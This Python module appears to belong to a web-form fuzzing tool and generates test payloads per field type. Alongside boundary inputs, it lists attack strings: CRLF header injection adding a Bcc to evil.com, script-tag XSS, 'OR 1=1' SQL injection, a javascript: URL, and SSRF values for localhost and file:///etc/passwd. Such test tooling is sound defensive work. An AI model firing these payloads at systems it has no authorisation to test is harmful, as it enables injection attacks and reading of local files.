"""Per-type payload generators.

Each generator returns the payloads appropriate for one FieldType. They
combine the shared attack sets (SQLi/XSS/etc.) with type-specific boundary
and malformed inputs. Every text-accepting field gets the injection sets,
because the server may mishandle input regardless of what the field claims
to be.
"""

from .base import (
    COMMAND_INJECTION,
    GENERIC_BOUNDARY,
    PATH_TRAVERSAL,
    SQLI,
    XSS,
    Payload,
    PayloadCategory,
)

# The injection payloads we throw at almost any free-form text field.
_TEXT_ATTACKS = SQLI + XSS + COMMAND_INJECTION + PATH_TRAVERSAL


def freetext_payloads() -> list[Payload]:
    """The kitchen sink -- free text is where most injection bugs live."""
    return [*GENERIC_BOUNDARY, *_TEXT_ATTACKS]


def search_payloads() -> list[Payload]:
    """Search boxes: like free text, XSS/SQLi heavy (reflected results)."""
    return [*GENERIC_BOUNDARY, *XSS, *SQLI]


def email_payloads() -> list[Payload]:
    """Email: malformed addresses + header injection + injection in local part."""
    specific = [
        Payload("not-an-email", PayloadCategory.BOUNDARY, "format", "Missing @ and domain"),
        Payload("a@b", PayloadCategory.BOUNDARY, "format", "No TLD"),
        Payload("@example.com", PayloadCategory.BOUNDARY, "format", "Missing local part"),
        Payload("a@b.com\r\nBcc: x@evil.com", PayloadCategory.ATTACK, "header_inject",
                "CRLF email-header injection"),
        Payload("\"<script>alert(1)</script>\"@x.com", PayloadCategory.ATTACK, "xss",
                "XSS in local part"),
        Payload("test'+OR+1=1--@x.com", PayloadCategory.ATTACK, "sqli", "SQLi in local part"),
    ]
    return [*specific, *GENERIC_BOUNDARY]


def integer_payloads() -> list[Payload]:
    """Numbers: signs, zero, boundaries, overflow, and non-numeric injection."""
    specific = [
        Payload("0", PayloadCategory.BOUNDARY, "zero", "Zero"),
        Payload("-1", PayloadCategory.BOUNDARY, "negative", "Negative value"),
        Payload("2147483648", PayloadCategory.BOUNDARY, "overflow", "32-bit int overflow"),
        Payload("9999999999999999999999", PayloadCategory.BOUNDARY, "overflow", "Huge value"),
        Payload("1.5", PayloadCategory.BOUNDARY, "type", "Float in int field"),
        Payload("0x1F", PayloadCategory.BOUNDARY, "type", "Hex literal"),
        Payload("1e10", PayloadCategory.BOUNDARY, "type", "Scientific notation"),
        Payload("abc", PayloadCategory.BOUNDARY, "type", "Non-numeric"),
        Payload("1 OR 1=1", PayloadCategory.ATTACK, "sqli", "Numeric-context SQLi"),
    ]
    return specific


def phone_payloads() -> list[Payload]:
    specific = [
        Payload("123", PayloadCategory.BOUNDARY, "format", "Too short"),
        Payload("+1-555-867-5309", PayloadCategory.BOUNDARY, "format", "Valid formatted"),
        Payload("abcdefghij", PayloadCategory.BOUNDARY, "type", "Letters in phone"),
    ]
    return [*specific, *SQLI, *XSS]


def url_payloads() -> list[Payload]:
    specific = [
        Payload("not a url", PayloadCategory.BOUNDARY, "format", "Malformed URL"),
        Payload("javascript:alert(1)", PayloadCategory.ATTACK, "xss", "JS scheme"),
        Payload("http://127.0.0.1:80/", PayloadCategory.ATTACK, "ssrf", "SSRF localhost"),
        Payload("file:///etc/passwd", PayloadCategory.ATTACK, "ssrf", "Local file scheme"),
    ]
    return [*specific, *GENERIC_BOUNDARY]


def date_payloads() -> list[Payload]:
    specific = [
        Payload("0000-00-00", PayloadCategory.BOUNDARY, "format", "Zero date"),
        Payload("2024-13-45", PayloadCategory.BOUNDARY, "format", "Invalid month/day"),
        Payload("9999-12-31", PayloadCategory.BOUNDARY, "format", "Far-future date"),
        Payload("not-a-date", PayloadCategory.BOUNDARY, "type", "Non-date text"),
    ]
    return [*specific, *SQLI]


def password_payloads() -> list[Payload]:
    """Passwords often hit auth/SQL paths -- SQLi + boundaries matter most."""
    return [*GENERIC_BOUNDARY, *SQLI]
